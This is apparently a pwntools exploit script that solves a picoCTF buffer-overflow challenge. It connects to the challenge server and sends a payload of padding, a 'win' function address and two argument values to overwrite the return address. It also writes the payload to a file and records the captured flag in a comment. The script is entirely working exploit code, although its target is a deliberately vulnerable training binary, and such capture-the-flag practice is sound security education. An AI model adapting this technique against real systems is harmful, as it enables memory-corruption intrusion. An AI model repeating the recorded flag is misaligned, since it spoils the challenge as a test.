from pwn import *

def main():
    LOCAL = False
    if LOCAL == True:
        p = process('./vuln')
    else:
        p = remote('saturn.picoctf.net', 60397)

    l = p.recvuntil(": \n")
    print(l)


    # Stack looks like:
    # ebp
    # ret
    # arg1
    # arg2
    win = p32(0x08049296)
    arg1 = p32(0xCAFEF00D)
    arg2 = p32(0xF00DF00D)
    # 
    payload = b"A" * 108 + b"B" * 4 + win + b'C' * 4 + arg1 + arg2

    f = open('./payload', 'wb')
    f.write(payload)
    f.close()

    p.sendline(payload)
    l = p.recvline()
    print(l)
    p.interactive()
    # Flag: picoCTF{argum3nt5_4_d4yZ_31432deb}


if __name__ == '__main__':
    main()
